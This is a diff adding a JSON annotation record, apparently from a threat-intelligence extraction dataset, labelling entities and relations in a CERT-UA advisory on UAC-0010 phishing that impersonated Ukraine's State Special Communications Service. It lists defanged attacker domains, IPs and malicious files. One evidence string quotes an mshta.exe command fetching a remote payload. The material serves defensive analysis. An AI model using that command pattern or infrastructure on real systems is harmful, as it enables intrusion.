@@ -1,0 +1,301 @@
+{
+  "docId": 2681855,
+  "date": "08.11.2022",
+  "title": "Кібератака групи UAC-0010: розсилання електронних листів, начебто, від імені Держспецзв'язку (CERT-UA#5570)",
+  "entities": [
+    {
+      "id": "2681855:0",
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign state located in Eastern Europe.",
+      "scheme": "S6",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "2681855:1",
+      "name": "Держспецзв'язку",
+      "kind": "government body",
+      "gloss": "The State Service of Special Communications and Information Protection of Ukraine.",
+      "scheme": "S7",
+      "category": "Government Body",
+      "role": "target"
+    },
+    {
+      "id": "2681855:2",
+      "name": "UAC-0010 (Armageddon)",
+      "kind": "threat actor",
+      "gloss": "A Russian state-sponsored cyber espionage and hacking group targeting Ukrainian entities.",
+      "scheme": "S19",
+      "category": "HackerGroup",
+      "role": "attacker"
+    },
+    {
+      "id": "2681855:3",
+      "name": "Telegram",
+      "kind": "software product",
+      "gloss": "A cloud-based instant messaging and social media platform.",
+      "scheme": "S1",
+      "category": "Organization",
+      "role": "related"
+    },
+    {
+      "id": "2681855:4",
+      "name": "cloudflare-dns[.]com",
+      "kind": "domain name",
+      "gloss": "A legitimate DNS over HTTPS resolution domain operated by Cloudflare.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "related"
+    },
+    {
+      "id": "2681855:5",
+      "name": "08362793@mail.gov[.]ua",
+      "kind": "email address",
+      "gloss": "A compromised or spoofed Ukrainian government email address used to distribute malicious messages.",
+      "scheme": "S14",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "2681855:6",
+      "name": "07-11-2022.xhtml",
+      "kind": "file",
+      "gloss": "A malicious HTML/XHTML file containing JavaScript designed to drop secondary payload archives.",
+      "scheme": "S12",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "2681855:7",
+      "name": "07_11_2022.xhtml",
+      "kind": "file",
+      "gloss": "A malicious HTML/XHTML file hosted on attacker infrastructure to deliver payloads.",
+      "scheme": "S12",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "2681855:8",
+      "name": "07.11.2022.rar",
+      "kind": "file",
+      "gloss": "A malicious RAR archive file dropped or downloaded during the infection process.",
+      "scheme": "S12",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "2681855:9",
+      "name": "08.11.2022.rar",
+      "kind": "file",
+      "gloss": "A malicious RAR archive containing an LNK shortcut file.",
+      "scheme": "S12",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "2681855:10",
+      "name": "08.11.2022.arhiv",
+      "kind": "file",
+      "gloss": "A malicious archive file hosted on adversary infrastructure.",
+      "scheme": "S12",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "2681855:11",
+      "name": "Засоби ТЗІ, які мають експертний висновок про відповідність до вимог технічного захисту інформації.lnk",
+      "kind": "file",
+      "gloss": "A malicious Windows shortcut file used to download and execute an HTA payload.",
+      "scheme": "S12",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "2681855:12",
+      "name": "growth.rtf",
+      "kind": "file",
+      "gloss": "A malicious payload file disguised as an RTF document.",
+      "scheme": "S12",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "2681855:13",
+      "name": "jersey",
+      "kind": "file",
+      "gloss": "A malicious file or payload component dropped to a victim system path.",
+      "scheme": "S12",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "2681855:14",
+      "name": "154[.]111.181.171",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the threat actor's network infrastructure.",
+      "scheme": "S13",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "2681855:15",
+      "name": "173[.]199.90.103",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious command and control infrastructure.",
+      "scheme": "S13",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "2681855:16",
+      "name": "45[.]32.171.4",
+      "kind": "ip address",
+      "gloss": "An IP address used in the adversary's network operations.",
+      "scheme": "S13",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "2681855:17",
+      "name": "arhiv.ua-cip[.]org",
+      "kind": "domain name",
+      "gloss": "A malicious subdomain used to host archive payloads imitating Ukrainian entities.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "attacker"
+    },
+    {
+      "id": "2681855:18",
+      "name": "tzi.info-cip[.]org",
+      "kind": "domain name",
+      "gloss": "A malicious subdomain used to host initial HTML/XHTML delivery files.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "attacker"
+    },
+    {
+      "id": "2681855:19",
+      "name": "civh[.]ru",
+      "kind": "domain name",
+      "gloss": "A malicious domain name hosting payloads retrieved by the HTA file.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "related"
+    },
+    {
+      "id": "2681855:20",
+      "name": "hilr[.]ru",
+      "kind": "domain name",
+      "gloss": "A malicious domain hosting subsequent payload stages.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "attacker"
+    },
+    {
+      "id": "2681855:21",
+      "name": "rubidiumo[.]ru",
+      "kind": "domain name",
+      "gloss": "A malicious domain name associated with the adversary infrastructure.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "2681855:22",
+      "name": "shapurt[.]ru",
+      "kind": "domain name",
+      "gloss": "An adversary domain name associated with the threat campaign.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "2681855:23",
+      "name": "ardeas[.]ru",
+      "kind": "domain name",
+      "gloss": "A malicious domain associated with the threat actor infrastructure.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "2681855:24",
+      "name": "ua-cip[.]org",
+      "kind": "domain name",
+      "gloss": "A spoofed domain registered to mimic Ukrainian government-related cybersecurity entities.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "2681855:25",
+      "name": "info-cip[.]org",
+      "kind": "domain name",
+      "gloss": "A masquerading domain used in the campaign's network infrastructure.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "2681855:26",
+      "name": "mshta.exe",
+      "kind": "software product",
+      "gloss": "A legitimate Windows utility used by adversaries to execute malicious HTML applications.",
+      "scheme": "S1",
+      "category": "Software",
+      "role": "related"
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0010 (Armageddon)",
+      "type": "impersonates",
+      "tail": "Держспецзв'язку",
+      "evidence": "розсилки електронних листів, начебто, від імені Держспецзв'язку"
+    },
+    {
+      "head": "UAC-0010 (Armageddon)",
+      "type": "uses-service",
+      "tail": "Telegram",
+      "evidence": "для визначення IP-адреси серверу управління використовується або третьосторонній сервіс (cloudflare-dns[.]com) або Telegram."
+    },
+    {
+      "head": "UAC-0010 (Armageddon)",
+      "type": "uses-service",
+      "tail": "cloudflare-dns[.]com",
+      "evidence": "для визначення IP-адреси серверу управління використовується або третьосторонній сервіс (cloudflare-dns[.]com)"
+    },
+    {
+      "head": "08.11.2022.rar",
+      "type": "contains-file",
+      "tail": "Засоби ТЗІ, які мають експертний висновок про відповідність до вимог технічного захисту інформації.lnk",
+      "evidence": "Згаданий архів містить файл-ярлик \"Засоби ТЗІ, які мають експертний висновок про відповідність до вимог технічного захисту інформації.lnk\""
+    },
+    {
+      "head": "arhiv.ua-cip[.]org",
+      "type": "hosts-file",
+      "tail": "08.11.2022.arhiv",
+      "evidence": "hXXp://arhiv.ua-cip[.]org/08.11.2022.arhiv"
+    },
+    {
+      "head": "tzi.info-cip[.]org",
+      "type": "hosts-file",
+      "tail": "07_11_2022.xhtml",
+      "evidence": "hXXp://tzi.info-cip[.]org/07_11_2022.xhtml"
+    },
+    {
+      "head": "hilr[.]ru",
+      "type": "hosts-file",
+      "tail": "growth.rtf",
+      "evidence": "hXXps://hilr[.]ru/07.11/growth.rtf"
+    },
+    {
+      "head": "mshta.exe",
+      "type": "connects-to",
+      "tail": "civh[.]ru",
+      "evidence": "C:\\Windows\\System32\\mshta.exe hxxps://civh[.]ru/08.11/band.rtf"
+    }
+  ],
+  "unclassified": []
+}
